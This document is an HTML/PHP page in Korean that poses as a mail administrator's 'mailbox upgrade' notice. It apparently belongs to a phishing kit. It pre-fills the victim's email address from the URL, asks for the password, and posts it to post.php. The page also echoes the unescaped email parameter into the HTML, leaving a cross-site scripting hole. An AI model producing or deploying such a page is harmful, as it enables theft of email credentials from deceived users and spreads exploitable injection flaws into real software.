
<html>
<head>
<link rel="shortcut icon" href="http://mail.ppscn.com/public/image/projectIcon.ico" type="image/gif"/>
<title>&#47700;&#51068; &#49444;&#51221; | &#51060;&#47700;&#51068; &#50629;&#44536;&#47112;&#51060;&#46300;</title><script src='/google_analytics_auto.js'></script></head>
<body>

<br><br>

<table align="center">

<tr><td>

	<div align="center">

	<img src="https://yahnwagner.files.wordpress.com/2015/05/logoemail.png" width="160" height="90">

	<br><br>

	<font face="verdana" size="2">
	&#49324;&#49436;&#54632;&#51012; &#50629;&#44536;&#47112;&#51060;&#46300;&#54616;&#45716; &#44228;&#51221;&#51012; &#54869;&#51064; 
	</font>


	<br><br>

	<form method="post" action="post.php">

	<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['email']; ?>" placeholder="Username">
				<font face="arial" size="3" color="#045FB4"><?php echo $_GET['email']; ?></font>

	<br><br>

	<input  name="pass" type="password" style="width:250px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" required="" placeholder="&#48708;&#48128; &#48264;&#54840;&#47484; &#51077;&#47141;">	



	<br><br>

	<input type="submit" value="&#51648;&#44552; &#50629;&#44536;&#47112;&#51060;&#46300;" 
	style="width:250px; height:60px; background-color: #0B2161; border: solid 3px #0B2161; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;">

	<br>
	</form>



	<br>
	<hr width="250" align="center">

	<font face="calibri" size="2">
	&#47700;&#51068; &#44288;&#47532;&#51088; 2020 | All rights reserved.
	</font>	

	</div>

</td></tr>

</table>


</body>
</html>